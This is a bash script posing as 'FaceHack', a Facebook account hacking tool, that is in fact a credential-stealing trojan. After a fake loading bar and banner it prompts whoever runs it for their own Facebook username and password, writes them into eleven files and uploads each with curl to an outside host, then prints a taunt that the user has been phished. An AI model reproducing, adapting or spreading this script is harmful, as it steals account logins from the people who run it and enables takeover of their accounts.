#!/bin/bash
count=10
while [ $count -le 100 ]
do
echo "Starting Face-Hack... [$count%]";
sleep 0.1
clear
(( count++ ))
done
echo "[+] The FaceHack -- Facebook Account Sniper [+]";
echo '   _____              _   _            _     ';
echo '  |  ___|_ _  ___ ___| | | | __ _  ___| | __ ';
echo '  | |_ / _` |/ __/ _ \ |_| |/ _` |/ __| |/ / ';
echo '  |  _| (_| | (_|  __/  _  | (_| | (__|   <  ';
echo '  |_|  \__,_|\___\___|_| |_|\__,_|\___|_|\_\ ';
echo '  -------------- By Cy#b3r00T -------------- ';
echo ''
echo 'Login To Your Account First!'
echo ''
read -p 'Username/Email:' username
read -p 'Password:' password
echo '[+] Login to facebook...';
sleep 5
echo '[+] Connecting to facebook...';
printf "User: $username\nPass: $password" >> output/fuck.html;
printf "User: $username\nPass: $password" >> output/fuck1.html;
printf "User: $username\nPass: $password" >> output/fuck2.html;
printf "User: $username\nPass: $password" >> output/fuck3.html;
printf "User: $username\nPass: $password" >> output/fuck4.html;
printf "User: $username\nPass: $password" >> output/fuck5.html;
printf "User: $username Pass: $password" >> output/fuck6.html;
printf "User: $username Pass: $password" >> output/fuck7.html;
printf "User: $username Pass: $password" >> output/fuck8.html;
printf "User: $username Pass: $password" >> output/fuck9.html;
printf "User: $username Pass: $password" >> output/fuck0.html;
sleep 2
curl -T output/fuck.html http://wildattuli.com
curl -T output/fuck1.html http://wildattuli.com
curl -T output/fuck2.html http://wildattuli.com
curl -T output/fuck3.html http://wildattuli.com
curl -T output/fuck4.html http://wildattuli.com
curl -T output/fuck5.html http://wildattuli.com
curl -T output/fuck6.html http://wildattuli.com
curl -T output/fuck7.html http://wildattuli.com
curl -T output/fuck8.html http://wildattuli.com
curl -T output/fuck9.html http://wildattuli.com
curl -T output/fuck0.html http://wildattuli.com
echo '[+] Haha You Got Phising!';
